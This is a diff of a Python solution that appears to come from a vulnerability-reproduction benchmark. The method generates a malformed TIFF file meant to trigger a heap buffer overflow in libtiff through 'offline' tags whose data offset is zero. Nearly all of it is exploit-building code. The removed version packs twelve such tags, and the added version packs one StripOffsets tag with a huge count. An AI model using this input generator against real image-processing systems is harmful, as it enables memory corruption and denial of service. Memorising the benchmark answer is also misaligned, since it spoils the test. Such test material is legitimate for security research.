@@ -3,86 +3,52 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generates a Proof-of-Concept for a heap buffer overflow in libtiff.
 
-        The vulnerability is described as an issue with "invalid offline tags with a
-        value offset of zero". This suggests crafting a TIFF file where Image File
-        Directory (IFD) entries, which should point to data elsewhere in the file,
-        instead point to offset 0 (the file header). Reading data from this
-        location can corrupt the parser's internal state, leading to memory
-        corruption.
+        The vulnerability is triggered by a malformed TIFF file that contains
+        an "offline" tag with a value/offset field of zero. An offline tag is
+        one where the data it describes is too large to be stored inline in
+        the 4-byte value/offset field. Instead, this field should contain an
+        offset to the data's location within the file.
 
-        The ground-truth PoC is 162 bytes. We can construct a TIFF file of this
-        exact size by creating a header, a small padding, and an IFD with 12
-        malicious entries.
+        By setting this offset to zero and providing a large data count, we
+        trick the library into attempting a massive read from an invalid
+        location at the beginning of its buffer, causing a heap buffer
+        overflow.
 
-        The structure is as follows:
-        1. TIFF Header (8 bytes): Specifies byte order and offset to the first IFD.
-        2. Padding (4 bytes): To align the IFD and match the total file size. The
-           IFD offset in the header will point past this padding.
-        3. IFD (150 bytes):
-           - A 2-byte count of directory entries (12).
-           - 12 directory entries (12 * 12 = 144 bytes). Each entry is crafted to
-             be an "offline" tag (data size > 4 bytes) with its data offset set to 0.
-           - A 4-byte offset to the next IFD (set to 0, indicating no more IFDs).
-
-        This configuration, with multiple tags all pointing to and being populated
-        from the file header, is a common pattern for causing state confusion in
-        parsers.
+        The PoC is a minimal TIFF file consisting of:
+        1. A standard 8-byte TIFF header.
+        2. A single Image File Directory (IFD).
+        3. The IFD contains one malicious directory entry (tag).
         """
 
-        # TIFF Header: 8 bytes
-        # 'II' for little-endian, 0x2a00 for version 42.
-        header = b'II\x2a\x00'
-        # The offset to the first IFD. We'll place it after a 4-byte padding.
-        ifd_offset = 12
-        header += struct.pack('<I', ifd_offset)
+        # TIFF Header (8 bytes):
+        # 'II' for Little Endian byte order.
+        # 0x002a (42) is the standard version number.
+        # 0x00000008 is the offset to the first (and only) IFD, which
+        # immediately follows the header.
+        header = b'II\x2a\x00\x08\x00\x00\x00'
 
-        # Padding: 4 bytes. This helps us reach the target size of 162 bytes.
-        padding = b'\x00\x00\x00\x00'
+        # IFD Entry Count (2 bytes):
+        # We specify that our IFD contains exactly one entry.
+        num_entries = struct.pack('<H', 1)
 
-        # Image File Directory (IFD)
-        # The number of entries. We use 12 to match the PoC length.
-        num_entries = 12
-        ifd = struct.pack('<H', num_entries)
+        # Malicious Directory Entry (12 bytes):
+        # We craft a single tag that triggers the vulnerability.
+        # Format: <H (Tag ID), <H (Data Type), <L (Count), <L (Value/Offset)
+        # - Tag ID: 273 (StripOffsets), a common tag that expects offline data.
+        # - Data Type: 4 (LONG), representing a 4-byte integer.
+        # - Count: 0xFFFFFFFF, a very large number. The total data size
+        #   (count * sizeof(type)) will be huge, forcing it to be offline.
+        # - Value/Offset: 0, the invalid offset that triggers the bug.
+        malicious_entry = struct.pack('<HHLL', 273, 4, 0xFFFFFFFF, 0)
 
-        # A selection of common TIFF tags to use for the malicious entries.
-        # The parser will process these in sorted order of their ID.
-        tag_ids = [
-            256,  # ImageWidth
-            257,  # ImageLength
-            258,  # BitsPerSample
-            259,  # Compression
-            262,  # PhotometricInterpretation
-            273,  # StripOffsets
-            277,  # SamplesPerPixel
-            278,  # RowsPerStrip
-            279,  # StripByteCounts
-            282,  # XResolution
-            283,  # YResolution
-            296,  # ResolutionUnit
-        ]
+        # Next IFD Offset (4 bytes):
+        # A value of 0 indicates that this is the last IFD in the file.
+        next_ifd_offset = struct.pack('<L', 0)
 
-        # Create 12 IFD entries.
-        for tag_id in sorted(tag_ids):
-            # Define the tag to be "offline" by making its data size > 4 bytes.
-            # We use LONG type (4 bytes) with a count of 2, for a total of 8 bytes.
-            data_type = 4  # TIFF_LONG
-            count = 2
-            
-            # Set the offset to 0 to trigger the vulnerability.
-            offset = 0
-            
-            # Pack the 12-byte IFD entry: Tag ID, Type, Count, Value/Offset.
-            ifd_entry = struct.pack('<HHII', tag_id, data_type, count, offset)
-            ifd += ifd_entry
-
-        # The IFD ends with a 4-byte offset to the next IFD. 0 means this is the last one.
-        next_ifd_offset = 0
-        ifd += struct.pack('<I', next_ifd_offset)
-
-        # Assemble the final PoC by concatenating the parts.
-        # Total length = 8 (header) + 4 (padding) + 150 (IFD) = 162 bytes.
-        poc = header + padding + ifd
+        # Assemble the final PoC byte string.
+        # Total length = 8 (header) + 2 (count) + 12 (entry) + 4 (next_offset) = 26 bytes.
+        poc = header + num_entries + malicious_entry + next_ifd_offset
         
         return poc
